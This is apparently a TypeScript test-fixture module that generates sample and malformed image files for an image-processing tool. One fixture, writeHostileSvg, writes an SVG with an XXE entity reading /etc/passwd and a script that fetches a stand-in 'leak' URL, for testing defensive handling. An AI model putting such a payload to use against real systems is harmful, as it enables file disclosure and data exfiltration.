import { mkdtemp, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import sharp from 'sharp'

/**
 * Fixtures are generated rather than committed: binary test assets rot, bloat
 * the repo, and hide what they actually contain. Generating them keeps the
 * intent of each fixture visible in code.
 */
export async function scratchDir(): Promise<string> {
  return mkdtemp(join(tmpdir(), 'pixelsmith-test-'))
}

const solid = (w: number, h: number) =>
  sharp({
    create: { width: w, height: h, channels: 3, background: { r: 200, g: 120, b: 40 } },
  })

export async function writePng(dir: string, name = 'a.png', w = 64, h = 48) {
  const p = join(dir, name)
  await solid(w, h).png().toFile(p)
  return p
}

export async function writeJpeg(dir: string, name = 'a.jpg', w = 64, h = 48) {
  const p = join(dir, name)
  await solid(w, h).jpeg().toFile(p)
  return p
}

export async function writeTiff(dir: string, name = 'a.tiff', w = 32, h = 32) {
  const p = join(dir, name)
  await solid(w, h).tiff().toFile(p)
  return p
}

export async function writeWebp(dir: string, name = 'a.webp', w = 32, h = 32) {
  const p = join(dir, name)
  await solid(w, h).webp().toFile(p)
  return p
}

/** A JPEG carrying the wrong extension — the polyglot / mislabel case. */
export async function writeMislabelled(dir: string, name = 'liar.png') {
  const p = join(dir, name)
  const jpeg = await solid(16, 16).jpeg().toBuffer()
  await writeFile(p, jpeg)
  return p
}

export async function writeEmpty(dir: string, name = 'empty.png') {
  const p = join(dir, name)
  await writeFile(p, Buffer.alloc(0))
  return p
}

export async function writeTextFile(dir: string, name = 'notes.txt') {
  const p = join(dir, name)
  await writeFile(p, 'this is definitely not an image\n')
  return p
}

export async function writeTruncatedPng(dir: string, name = 'cut.png') {
  const p = join(dir, name)
  const full = await solid(64, 64).png().toBuffer()
  await writeFile(p, full.subarray(0, Math.floor(full.length / 3)))
  return p
}

/** SVG with a script element and an external entity — the XXE / script case. */
export async function writeHostileSvg(dir: string, name = 'evil.svg') {
  const p = join(dir, name)
  const svg = [
    '<?xml version="1.0"?>',
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40">',
    '  <script type="text/javascript">fetch("http://example.invalid/leak")</script>',
    '  <image href="http://example.invalid/tracker.png" x="0" y="0" width="10" height="10"/>',
    '  <rect width="40" height="40" fill="green"/>',
    '  <text x="2" y="20">&xxe;</text>',
    '</svg>',
  ].join('\n')
  await writeFile(p, svg)
  return p
}

export async function writePlainSvg(dir: string, name = 'ok.svg') {
  const p = join(dir, name)
  await writeFile(
    p,
    '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="30"><rect width="40" height="30" fill="blue"/></svg>',
  )
  return p
}

export async function writeAnimatedGif(dir: string, name = 'anim.gif', frames = 4) {
  const p = join(dir, name)
  const w = 16
  const h = 16
  const pages = await Promise.all(
    Array.from({ length: frames }, (_, i) =>
      sharp({ create: { width: w, height: h, channels: 3, background: { r: i * 50, g: 80, b: 120 } } })
        .png()
        .toBuffer(),
    ),
  )
  // `join` is how sharp assembles discrete frames into a real animation;
  // a plain tall strip produces a single-page GIF.
  await sharp(pages, { join: { across: 1, animated: true } })
    .gif({ loop: 0, delay: Array(frames).fill(100) })
    .toFile(p)
  return p
}
